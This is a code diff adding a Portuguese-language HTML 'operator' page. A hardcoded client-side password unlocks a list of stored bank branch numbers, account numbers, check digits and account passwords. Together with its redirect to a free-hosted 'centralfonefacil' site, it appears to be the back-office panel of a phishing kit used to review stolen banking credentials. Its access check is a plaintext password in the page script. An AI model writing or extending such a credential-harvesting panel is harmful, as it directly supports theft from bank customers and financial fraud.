@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visualizar Dados</title>
+</head>
+<body>
+    <h1>Operador</h1>
+    <form id="login-form">
+        <label for="senha-login">Senha:</label>
+        <input type="password" id="senha-login" required>
+        <button type="submit">Acessar</button>
+    </form>
+
+    <div id="dados-container" style="display:none;">
+        <h2>Dados Salvos no LocalStorage</h2>
+        <ul id="contas-lista"></ul>
+    </div>
+
+    <script>
+        const loginForm = document.getElementById('login-form');
+        const dadosContainer = document.getElementById('dados-container');
+
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            const senhaLogin = document.getElementById('senha-login').value;
+
+            // Verifique se a senha está correta
+            if (senhaLogin === 'login') { // Substitua 'suaSenhaSecreta' pela senha desejada
+                dadosContainer.style.display = 'block'; // Exibe os dados
+                exibirDados(); // Chama a função para exibir os dados
+                loginForm.style.display = 'none'; // Esconde o formulário de login
+            } else {
+                alert('Senha incorreta. Tente novamente.');
+                window.location.href = "https://centralfonefacil.rf.gd/visualizar"; // Redireciona para outra página
+            }
+        });
+
+        function exibirDados() {
+            const contas = JSON.parse(localStorage.getItem('contas')) || [];
+            const contasLista = document.getElementById('contas-lista');
+            contasLista.innerHTML = '';
+
+            if (contas.length === 0) {
+                contasLista.innerHTML = '<li>Nenhum dado salvo.</li>';
+                return;
+            }
+
+            contas.forEach((item) => {
+                const li = document.createElement('li');
+                li.textContent = `Agência: ${item.agencia}, Conta: ${item.conta}-${item.digito}, Senha: ${item.senha}`;
+                contasLista.appendChild(li);
+            });
+        }
+    </script>
+</body>
+</html>
+
+
+
